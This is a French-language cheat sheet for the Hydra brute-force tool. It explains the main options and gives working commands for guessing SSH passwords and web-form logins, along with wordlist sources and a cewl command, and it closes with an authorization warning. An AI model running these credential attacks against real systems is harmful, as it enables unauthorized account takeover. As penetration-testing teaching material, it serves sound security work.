# 🌊 Hydra : Le Guide Pratique

Hydra est un outil de brute-force réseau extrêmement rapide et flexible. Il peut attaquer de nombreux services qui nécessitent une authentification.

## 🔥 Syntaxe et Commandes Essentielles

La syntaxe de base consiste à fournir une cible, un service, et des listes d'identifiants/mots de passe.

| Option | Description |
|---|---|
| `-l <USER>` | Spécifie un seul nom d'utilisateur. |
| `-L <FILE>` | Spécifie un fichier contenant une liste de noms d'utilisateur. |
| `-p <PASS>` | Spécifie un seul mot de passe. |
| `-P <FILE>` | Spécifie un fichier contenant une liste de mots de passe. |
| `-t <NUM>` | Nombre de threads (tâches parallèles). Une valeur de 16 ou 32 est un bon début. |
| `-f` | Arrête l'attaque dès qu'une combinaison valide est trouvée. |
| `-o <FILE>` | Sauvegarde les résultats dans un fichier. |

## 🎯 Exemples d'Attaques

### Brute-force d'un service SSH

```bash
# Tenter de se connecter en SSH avec l'utilisateur "root" et une liste de mots de passe
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# Utiliser une liste d'utilisateurs et de mots de passe
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh -t 32 -f
```

### Brute-force d'un formulaire web (HTTP POST)

C'est l'une des commandes les plus puissantes mais aussi les plus complexes d'Hydra.

```bash
# Syntaxe : hydra -L <users> -P <passes> <IP> http-post-form "<URL>:<PARAMS>:F=<MSG_ERREUR>"
hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```

- **`/login.php`** : La page qui traite le formulaire.
- **`user=^USER^&pass=^PASS^`** : Les paramètres du formulaire. `^USER^` et `^PASS^` sont les variables qu'Hydra remplacera.
- **`F=Invalid`** : Indique à Hydra que la tentative a échoué si le mot "Invalid" est trouvé dans la réponse de la page.

## 📚 Wordlists Recommandées

- **/usr/share/wordlists/rockyou.txt** : La liste de base, toujours un bon point de départ.
- **SecLists** : La collection la plus complète. Si vous l'avez, cherchez dans `/usr/share/seclists/`.
- **Cewl** : Un outil qui peut créer une wordlist personnalisée à partir d'un site web. Très efficace pour trouver des mots de passe liés à l'entreprise.
  ```bash
  cewl http://example.com -w custom_list.txt
  ```

---
> ⚠️ **USAGE ÉTHIQUE & LÉGAL** : Les attaques par force brute sont bruyantes et facilement détectables. N'utilisez Hydra que sur des systèmes pour lesquels vous avez une autorisation explicite.
